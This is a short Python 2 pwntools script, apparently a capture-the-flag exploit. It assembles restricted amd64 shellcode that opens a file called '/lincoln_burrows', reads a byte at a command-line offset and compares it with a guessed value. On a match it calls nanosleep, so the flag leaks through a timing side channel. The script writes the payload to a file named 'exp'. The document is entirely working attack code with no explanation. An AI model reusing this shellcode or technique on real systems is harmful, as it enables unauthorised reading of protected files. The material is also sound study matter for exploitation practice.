from pwn import *
import sys

context.bits = 64
context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

#
offset = int(sys.argv[1])
value = int(sys.argv[2])
print sys.argv
shellcode = asm('''
pop rax
pop rcx
pop rcx
pop rcx
.byte 0x38
.byte 0x38
pop rcx
pop rcx
pop rcx
pop rcx
.byte 0x38
.byte 0x38
pop rcx
pop rcx
pop rcx
pop rcx
.byte 0x38
.byte 0x38
pop rcx
push rsp
pop rdi
push rcx
.byte 0x38
.byte 0x38
xor ax,0x629
.byte 0x38
.byte 0x38
push rax
pop rsp
push 0x2
.byte 0x38
.byte 0x38
pop rax
pop rsi
syscall
.byte 0x38
.byte 0x38
push rax
pop rdi
push {}
.byte 0x38
.byte 0x38
pop rsi
pop rdx
xor al,11
.byte 0x38
.byte 0x38
syscall
push rsp
pop rsi
.byte 0x38
.byte 0x38
push rbx
push 0x1
pop rdx
.byte 0x38
.byte 0x38
pop rax
syscall
'''.format(offset))
shellcode += "\x72\x2a"
# log.info(hex(len(shellcode)))
shellcode = shellcode.ljust(0x60, "A") + "/lincoln_burrows\x00"
shellcode += asm('''
pop rax
cmp al,{}
je end
push 0x70
push 0x70
push rsp
pop rdi
push 0x0
push 0x0
push rsp
pop rsi
push 35
pop rax
syscall
end:
'''.format(value))
# print(shellcode)
open("exp", "w").write(shellcode)
